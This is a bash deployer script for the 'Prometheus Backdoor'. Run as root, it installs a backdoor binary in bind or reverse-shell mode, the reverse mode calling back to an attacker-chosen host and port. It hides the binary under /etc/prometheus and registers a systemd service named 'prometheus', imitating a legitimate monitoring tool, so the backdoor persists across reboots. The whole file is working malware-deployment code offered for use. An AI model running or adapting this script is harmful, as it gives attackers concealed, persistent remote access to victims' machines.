#!/usr/bin/bash
#usage: sudo deploy.sh [bind/reverse]
#			if bind:      [LPORT] [PASSWORD]
#			if reverse:   [LHOST] [LPORT] [RETRYTIME] [PASSWORD]

echo "Prometheus Backdoor deployer, v0.1"
echo ""

if [ "$UID" != "0" ];
then
	echo "Script must be run as root."
	exit
fi


if [ "$#" -lt "3" ];
then
	echo "usage: sudo deploy.sh [bind/reverse]"
	echo "                       if bind:      [LPORT] [PASSWORD]"
    echo "                       if reverse:   [LHOST] [LPORT] [RETRYTIME]"
	echo ""
	exit
fi


ls /etc/prometheus > /dev/null
if [ "$?" -eq "0" ];
then
	echo "[!] It seems prometheus is already deployed against this machine... Aborting!"
	exit
fi


if [ "$1" = "bind" ];
then
    echo "[*] Deploying prometheus in bind mode"
    echo "[*] Creating n0sl33p with your parameters..."
	sed "s/DEFAULTPASSWORD/$3/g" n0sl33p_default > n0sl33p
	sed -i "s/DEFAULTMODE/bind/g" n0sl33p
	sed -i "s/65456/$2/g" n0sl33p
	echo "[+] Done!"
	echo "[*] Creating necessary folders and files..."
	mkdir /etc/prometheus
	chmod 700 /etc/prometheus
	mv n0sl33p /etc/prometheus
	chmod 500 /etc/prometheus
	chmod 555 /etc/prometheus/n0sl33p
	cp prometheus.service /lib/systemd/system/
	chmod 500 /lib/systemd/system/prometheus.service
	echo "[*] Starting and enabling service..."
	systemctl daemon-reload
	systemctl start prometheus
	systemctl enable prometheus
	echo "[+] All done!"

elif [ "$1" = "reverse" ];
then
    echo "[*] Deploying prometheus in reverse mode"
    echo "[*] Creating n0sl33p with your parameters..."
	sed "s/localhost/$2/g" n0sl33p_default > n0sl33p
	sed -i "s/DEFAULTMODE/reverse/g" n0sl33p
	sed -i "s/65456/$3/g" n0sl33p
	sed -i "s/retrytime=2/retrytime=$4/g" n0sl33p
	echo "[+] Done!"
	echo "[*] Creating necessary folders and files..."
	mkdir /etc/prometheus
	chmod 500 /etc/prometheus
	mv n0sl33p /etc/prometheus
	chmod 555 /etc/prometheus/n0sl33p
	cp cleanup.sh /etc/prometheus
	chmod 555 /etc/prometheus/cleanup.sh
	cp prometheus.service /lib/systemd/system/
	chmod 500 /lib/systemd/system/prometheus.service
	echo "[*] Starting and enabling service..."
	systemctl daemon-reload
	systemctl start prometheus
	systemctl enable prometheus
	echo "[+] All done!"

fi
